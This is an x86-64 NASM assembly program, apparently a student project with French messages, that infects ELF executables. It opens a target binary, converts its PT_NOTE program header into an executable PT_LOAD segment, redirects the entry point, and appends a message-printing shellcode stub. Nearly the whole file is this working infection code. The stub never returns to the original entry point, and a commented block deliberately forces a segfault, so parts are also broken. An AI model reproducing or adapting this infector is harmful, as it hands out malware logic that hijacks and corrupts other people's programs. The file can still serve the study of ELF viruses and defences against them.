section .data
msg_not_elf_new db "Ce fichier n'est pas un ELF compatible.",0xA
len_not_elf_new equ $ - msg_not_elf_new
msg_dir_new db "C'est un dossier, operation impossible.",0xA
len_dir_new equ $ - msg_dir_new
msg_usage_new db "Usage: ./projet <filename>",0xA
len_usage_new equ $ - msg_usage_new
msg_open_err_new db "Impossible d'ouvrir ce fichier.",0xA
len_open_err_new equ $ - msg_open_err_new
msg_ok_new db "Fichier modifie avec succes!",0xA
len_ok_new equ $ - msg_ok_new
section .bss
magic_area resb 4
info_stat resb 144
elf_buf resb 64
ph_buf resb 56
ph_off     resq 1
ph_esize   resw 1
ph_count   resw 1
cur_ofs   resq 1
fd_sav    resq 1
nt_ofs    resq 1
nt_found  resb 1
o_entry   resq 1
vmax_end  resq 1
section .data.shellcode
shellcode:

    lea rbx, [rel infection_msg]
    sub rbx, infmsg_off
    mov rax,1
    mov rdi,1
    lea rsi,[rbx + infmsg_off]
    mov rdx,infmsg_len
    syscall
    mov r15,[rbx + oent_off]
    mov rcx,[rbx + pvaddr_off]
    sub rbx,rcx
    add r15,rbx

infection_msg db "Le contenu a ete ajuste discretement!",0xA
infmsg_len equ $ - infection_msg
orig_str dq 0
pvaddr_str dq 0
shell_end:
infmsg_off equ infection_msg - shellcode
oent_off equ orig_str - shellcode
pvaddr_off equ pvaddr_str - shellcode
sc_size equ shell_end - shellcode
section .text
global _start
_start:
    pop rax
    cmp rax,2
    jl usage_mix
    pop rax
    pop rdi
    mov rax,4
    lea rsi,[info_stat]
    syscall
    cmp rax,0
    jne err_open
    mov rax,[info_stat+16]
    cmp rax,2
    je dir_mix
    mov rax,2
    mov rsi,2
    syscall
    cmp rax,0
    jl err_open
    mov [fd_sav],rax
    mov rax,0
    mov rdi,[fd_sav]
    mov rsi,magic_area
    mov rdx,4
    syscall
    cmp rax,4
    jne not_elf_m
    mov eax,dword [magic_area]
    cmp eax,0x464C457F
    jne not_elf_m
    mov rax,8
    mov rdi,[fd_sav]
    xor rsi,rsi
    xor rdx,rdx
    syscall
    cmp rax,-1
    je err_open
    mov rax,0
    mov rdi,[fd_sav]
    lea rsi,[elf_buf]
    mov rdx,64
    syscall
    cmp rax,64
    jne err_open
    mov rax,qword [elf_buf+0x20]
    mov [ph_off],rax
    movzx eax,word [elf_buf+0x38]
    mov [ph_count],ax
    movzx eax,word [elf_buf+0x36]
    mov [ph_esize],ax
    mov rax,[elf_buf+24]
    mov [o_entry],rax
    movzx r12,word [ph_count]
    mov rsi,[ph_off]
    mov [cur_ofs],rsi
    mov rax,0
    mov [vmax_end],rax
    push rbx
    push rcx
    push rdx
    nop
    xor rdx,rdx
    pop rdx
    pop rcx
    pop rbx
    nop
scan_load_and_note:
    cmp r12,0
    je after_load_scan
read_ph:
    mov rax,8
    mov rdi,[fd_sav]
    mov rsi,[cur_ofs]
    xor rdx,rdx
    syscall
    mov rax,0
    mov rdi,[fd_sav]
    lea rsi,[ph_buf]
    movzx rdx, word [ph_esize]
    syscall
    mov eax,dword [ph_buf]
    cmp eax,1
    jne skip_load_upd
    mov rax,[ph_buf+16]
    mov rbx,[ph_buf+40]
    add rax,rbx
    cmp rax,[vmax_end]
    jbe skip_load_upd
    mov [vmax_end],rax
skip_load_upd:
    movzx rax,word [ph_esize]
    mov rsi,[cur_ofs]
    add rsi,rax
    mov [cur_ofs],rsi
    dec r12
    cmp r12,0
    jne read_ph
after_load_scan:
    mov rsi,[ph_off]
    mov [cur_ofs],rsi
    movzx r12, word [ph_count]
    mov byte [nt_found],0
find_note_mix:
    cmp r12,0
    je no_nt_found_m
nt_loop_m:
    mov rax,8
    mov rdi,[fd_sav]
    mov rsi,[cur_ofs]
    xor rdx,rdx
    syscall
    mov rax,0
    mov rdi,[fd_sav]
    lea rsi,[ph_buf]
    movzx rdx, word [ph_esize]
    syscall
    mov eax,dword [ph_buf]
    cmp eax,4
    jne next_phb_m
    mov rax,[cur_ofs]
    mov [nt_ofs],rax
    mov byte [nt_found],1
    jmp have_nt_m
next_phb_m:
    movzx rax,word [ph_esize]
    mov rsi,[cur_ofs]
    add rsi,rax
    mov [cur_ofs],rsi
    dec r12
    jmp find_note_mix
no_nt_found_m:
    jmp close_end_mix
have_nt_m:
    mov al,[nt_found]
    cmp al,0
    je close_end_mix
    nop
    mov rax,8
    mov rdi,[fd_sav]
    mov rsi,[nt_ofs]
    xor rdx,rdx
    syscall
    mov rax,0
    mov rdi,[fd_sav]
    lea rsi,[ph_buf]
    movzx rdx, word [ph_esize]
    syscall
    mov rax,8
    mov rdi,[fd_sav]
    xor rsi,rsi
    mov rdx,2
    syscall
    mov r15,rax
    xor rcx,rcx
    add r15,0xFFF
    and r15,0xFFFFFFFFFFFFF000
    mov r14,r15
    sub rsp,56
    mov rcx,56
    mov rsi,ph_buf
    mov rdi,rsp
    rep movsb
    mov dword [ph_buf],1
    mov dword [ph_buf+4],5
    mov qword [ph_buf+8],r14
    mov rax,[vmax_end]
    add rax,0xFFF
    and rax,0xFFFFFFFFFFFFF000
    add rax,0x400000
    mov qword [ph_buf+16],rax
    mov qword [ph_buf+24],rax
    mov rax,sc_size
    mov qword [ph_buf+32],rax
    mov qword [ph_buf+40],rax
    mov qword [ph_buf+48],0x1000
    mov rax,qword [ph_buf+16]
    mov [elf_buf+24],rax
    mov rax,8
    mov rdi,[fd_sav]
    xor rsi,rsi
    xor rdx,rdx
    syscall
    mov rax,1
    mov rdi,[fd_sav]
    lea rsi,[elf_buf]
    mov rdx,64
    syscall
    mov rax,8
    mov rdi,[fd_sav]
    mov rsi,[nt_ofs]
    xor rdx,rdx
    syscall
    mov rax,1
    mov rdi,[fd_sav]
    lea rsi,[ph_buf]
    mov rdx,56
    syscall
    mov rax,[o_entry]
    mov rdi,shellcode
    add rdi,oent_off
    mov [rdi],rax
    mov rax,[ph_buf+16]
    mov rdi,shellcode
    add rdi,pvaddr_off
    mov [rdi],rax
    mov rax,8
    mov rdi,[fd_sav]
    mov rsi,r14
    xor rdx,rdx
    syscall
    mov rax,1
    mov rdi,[fd_sav]
    mov rsi,shellcode
    mov rdx,sc_size
    syscall
    add rsp,56
    nop
    mov rax,1
    mov rdi,1
    lea rsi,[msg_ok_new]
    mov rdx,len_ok_new
    syscall
 
    ; Affiche le shellcode avant le segfault
    mov rax,1
    mov rdi,1
    mov rsi,shellcode
    mov rdx,sc_size
    syscall
 
    ; Erreur dans le calcul d'adresse pour provoquer segfault
    ; On ajoute un offset énorme à l'adresse du shellcode
    mov rax, shellcode
    add rax, 0xFFFFFFFFFFFF0000 ; Adresse invalide
    mov rbx, [rax] ; Lecture à une adresse invalide -> segfault
 
    jmp close_end_mix
not_elf_m:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_not_elf_new]
    mov rdx,len_not_elf_new
    syscall
    jmp close_end_mix
dir_mix:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_dir_new]
    mov rdx,len_dir_new
    syscall
    jmp end_exit_mix
usage_mix:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_usage_new]
    mov rdx,len_usage_new
    syscall
    jmp end_exit_mix
err_open:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_open_err_new]
    mov rdx,len_open_err_new
    syscall
    jmp end_exit_mix
close_end_mix:
    mov rax,3
    mov rdi,[fd_sav]
    syscall
    jmp end_exit_mix
end_exit_mix:
    mov rax,60
    xor rdi,rdi
    syscall
